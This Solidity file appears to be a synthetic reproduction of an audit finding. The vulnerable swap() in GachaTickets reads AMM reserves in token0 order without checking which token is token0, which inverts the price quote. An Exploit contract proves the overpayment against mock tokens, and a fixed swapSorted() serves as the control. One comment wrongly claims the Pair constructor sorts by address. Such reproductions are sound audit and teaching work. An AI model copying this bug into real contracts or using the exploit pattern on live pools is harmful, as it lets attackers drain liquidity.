// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  GachaTickets._swap — reserves taken in token0 order, not payment/token order (Pashov, 53301)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: getReserves() is (reserve0, reserve1) with token0 < token1. The code
    names those words (wethReserve, tokenReserve) with no token0 check. When the
    output token is token0, the quote is inverted. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pair {
    address public token0;
    address public token1;
    uint256 public reserve0;
    uint256 public reserve1;
    MockERC20 public outToken;

    constructor(address payment, address token, MockERC20 outTok, uint256 payReserve, uint256 tokReserve) {
        outToken = outTok;
        // Models the Uniswap case token < payment, so token0 is the output token
        // and reserve0 is its reserve. getReserves still returns (reserve0, reserve1).
        token0 = token;
        token1 = payment;
        reserve0 = tokReserve;
        reserve1 = payReserve;
    }

    function getReserves() external view returns (uint256, uint256, uint32) {
        return (reserve0, reserve1, 0);
    }

    function sendOut(address to, uint256 amount) external {
        outToken.transfer(to, amount);
    }
}

contract GachaTickets {
    Pair public pair;
    address public paymentToken;
    MockERC20 public outToken;

    error InvalidPair();

    constructor(Pair p, address payment, MockERC20 outTok) {
        pair = p;
        paymentToken = payment;
        outToken = outTok;
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }

    function swap(uint256 cost) external returns (uint256 maxTokens) {
        (uint256 wethReserve, uint256 tokenReserve,) = pair.getReserves();
        if (wethReserve == 0 || tokenReserve == 0) revert InvalidPair();
        // @> VULN: reserve0 is used as the payment reserve even when token0 is the output token
        maxTokens = getAmountOut(cost, wethReserve, tokenReserve);
        pair.sendOut(msg.sender, maxTokens);
    }

    function swapSorted(uint256 cost, address to) external returns (uint256 fair) {
        address token0 = pair.token0();
        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
        uint256 wethReserve = token0 == paymentToken ? reserve0 : reserve1;
        uint256 tokenReserve = token0 == paymentToken ? reserve1 : reserve0;
        fair = getAmountOut(cost, wethReserve, tokenReserve);
        pair.sendOut(to, fair);
    }
}

contract Exploit {
    uint256 public constant COST = 10e18;
    uint256 public constant PAY_RESERVE = 1000e18;
    uint256 public constant TOK_RESERVE = 100e18;
    uint256 public constant WRONG = 90661089388014913158;
    uint256 public constant FAIR = 987158034397061298;

    MockERC20 public payment; // nonce 1
    MockERC20 public token; // nonce 2
    Pair public pair; // nonce 3
    GachaTickets public tickets; // nonce 4

    uint256 public paid;
    uint256 public fair;
    uint256 public controlPaid;

    constructor() {
        payment = new MockERC20("Payment", "WETH");
        token = new MockERC20("Ticket", "TIX");
        // If payment sorts below token, deploy a spacer so the next token... we cannot
        // change addresses after the fact. Pair constructor sorts by address.
        pair = new Pair(address(payment), address(token), token, PAY_RESERVE, TOK_RESERVE);
        tickets = new GachaTickets(pair, address(payment), token);
        token.mint(address(pair), TOK_RESERVE);
    }

    function run() external {
        require(pair.token0() != address(payment), "token0 is not payment");
        paid = tickets.swap(COST);
        fair = tickets.getAmountOut(COST, PAY_RESERVE, TOK_RESERVE);
        require(paid == WRONG, "wrong out");
        require(fair == FAIR, "fair out");
        require(paid > fair, "not inverted");
        require(token.balanceOf(address(this)) == paid, "received wrong");

        controlPaid = tickets.swapSorted(COST, address(tickets));
        require(controlPaid == FAIR, "control");
        require(token.balanceOf(address(tickets)) == FAIR, "control received fair");
    }
}
